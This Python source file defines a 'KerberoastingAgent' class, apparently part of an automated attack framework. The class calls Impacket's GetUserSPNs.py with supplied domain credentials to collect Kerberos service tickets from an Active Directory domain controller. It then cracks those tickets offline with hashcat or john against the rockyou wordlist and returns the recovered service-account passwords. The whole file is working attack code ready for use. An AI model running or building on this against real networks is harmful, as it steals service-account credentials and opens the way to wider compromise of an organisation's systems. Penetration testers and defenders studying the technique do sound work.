"""
Kerberoasting Agent

Extracts and cracks service account passwords by requesting TGS tickets.
"""

import asyncio
import subprocess
import os
import json
from typing import Dict, List, Any
from core.base_agent import BaseAgent
from core.agent_data import AgentData


class KerberoastingAgent(BaseAgent):
    """
    Agent for Kerberoasting attacks against Active Directory.
    
    Capabilities:
    - Enumerate Service Principal Names (SPNs)
    - Request TGS tickets for service accounts
    - Extract tickets from memory
    - Crack tickets offline with hashcat/john
    """
    
    def __init__(self):
        super().__init__(
            name="KerberoastingAgent",
            description="Extract and crack service account passwords via Kerberoasting",
            version="1.0.0"
        )
        self.output_dir = "workspace/kerberoast"
        os.makedirs(self.output_dir, exist_ok=True)
    
    async def run(self, strategy: Dict[str, Any]) -> AgentData:
        """
        Execute Kerberoasting attack.
        
        Args:
            strategy: Attack strategy containing:
                - domain: Target domain
                - username: Domain username
                - password: Domain password
                - dc_ip: Domain Controller IP
                - crack: Whether to crack tickets (default: True)
        
        Returns:
            AgentData with extracted and cracked credentials
        """
        try:
            domain = strategy.get('domain')
            username = strategy.get('username')
            password = strategy.get('password')
            dc_ip = strategy.get('dc_ip')
            crack = strategy.get('crack', True)
            
            if not all([domain, username, password, dc_ip]):
                return AgentData(
                    success=False,
                    errors=["Missing required parameters: domain, username, password, dc_ip"]
                )
            
            self.log_info(f"Starting Kerberoasting attack on {domain}")
            
            # Step 1: Enumerate SPNs
            spns = await self._enumerate_spns(domain, username, password, dc_ip)
            if not spns:
                return AgentData(
                    success=False,
                    errors=["No SPNs found"]
                )
            
            self.log_success(f"Found {len(spns)} service accounts with SPNs")
            
            # Step 2: Request TGS tickets
            tickets = await self._request_tgs_tickets(domain, username, password, dc_ip, spns)
            if not tickets:
                return AgentData(
                    success=False,
                    errors=["Failed to extract TGS tickets"]
                )
            
            self.log_success(f"Extracted {len(tickets)} TGS tickets")
            
            # Step 3: Crack tickets (optional)
            cracked_creds = []
            if crack:
                cracked_creds = await self._crack_tickets(tickets)
                if cracked_creds:
                    self.log_success(f"Cracked {len(cracked_creds)} passwords!")
            
            return AgentData(
                success=True,
                data={
                    'spns': spns,
                    'tickets': tickets,
                    'cracked_credentials': cracked_creds,
                    'ticket_file': f"{self.output_dir}/tickets.txt"
                }
            )
            
        except Exception as e:
            self.log_error(f"Kerberoasting failed: {str(e)}")
            return AgentData(success=False, errors=[str(e)])
    
    async def _enumerate_spns(self, domain: str, username: str, password: str, dc_ip: str) -> List[Dict]:
        """Enumerate Service Principal Names using Impacket GetUserSPNs."""
        try:
            cmd = [
                'GetUserSPNs.py',
                f'{domain}/{username}:{password}',
                '-dc-ip', dc_ip,
                '-request',
                '-outputfile', f'{self.output_dir}/tickets.txt'
            ]
            
            self.log_info("Enumerating SPNs...")
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                self.log_error(f"GetUserSPNs failed: {stderr.decode()}")
                return []
            
            # Parse output
            spns = []
            for line in stdout.decode().split('\n'):
                if 'ServicePrincipalName' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        spns.append({
                            'spn': parts[0],
                            'account': parts[1] if len(parts) > 1 else 'Unknown'
                        })
            
            return spns
            
        except Exception as e:
            self.log_error(f"SPN enumeration failed: {str(e)}")
            return []
    
    async def _request_tgs_tickets(self, domain: str, username: str, password: str, 
                                   dc_ip: str, spns: List[Dict]) -> List[str]:
        """Request TGS tickets for service accounts."""
        try:
            # Tickets are already extracted by GetUserSPNs
            ticket_file = f'{self.output_dir}/tickets.txt'
            
            if not os.path.exists(ticket_file):
                return []
            
            with open(ticket_file, 'r') as f:
                tickets = [line.strip() for line in f if line.strip()]
            
            return tickets
            
        except Exception as e:
            self.log_error(f"Ticket extraction failed: {str(e)}")
            return []
    
    async def _crack_tickets(self, tickets: List[str]) -> List[Dict]:
        """Crack TGS tickets using hashcat or john."""
        try:
            cracked = []
            ticket_file = f'{self.output_dir}/tickets.txt'
            output_file = f'{self.output_dir}/cracked.txt'
            
            # Try hashcat first (faster)
            if await self._check_tool_exists('hashcat'):
                self.log_info("Cracking tickets with hashcat...")
                cmd = [
                    'hashcat',
                    '-m', '13100',  # Kerberos 5 TGS-REP etype 23
                    ticket_file,
                    '/usr/share/wordlists/rockyou.txt',  # Common wordlist
                    '-o', output_file,
                    '--force'
                ]
                
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                await process.communicate()
            
            # Try john if hashcat fails
            elif await self._check_tool_exists('john'):
                self.log_info("Cracking tickets with john...")
                cmd = [
                    'john',
                    '--wordlist=/usr/share/wordlists/rockyou.txt',
                    ticket_file
                ]
                
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                await process.communicate()
                
                # Show cracked passwords
                show_cmd = ['john', '--show', ticket_file]
                process = await asyncio.create_subprocess_exec(
                    *show_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, _ = await process.communicate()
                
                # Parse john output
                for line in stdout.decode().split('\n'):
                    if ':' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            cracked.append({
                                'account': parts[0],
                                'password': parts[1]
                            })
            
            # Read cracked passwords from output file
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    for line in f:
                        if ':' in line:
                            parts = line.strip().split(':')
                            if len(parts) >= 2:
                                cracked.append({
                                    'hash': parts[0],
                                    'password': parts[-1]
                                })
            
            return cracked
            
        except Exception as e:
            self.log_error(f"Ticket cracking failed: {str(e)}")
            return []
    
    async def _check_tool_exists(self, tool: str) -> bool:
        """Check if a tool is installed."""
        try:
            process = await asyncio.create_subprocess_exec(
                'which', tool,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await process.communicate()
            return process.returncode == 0
        except Exception as e:
            return False

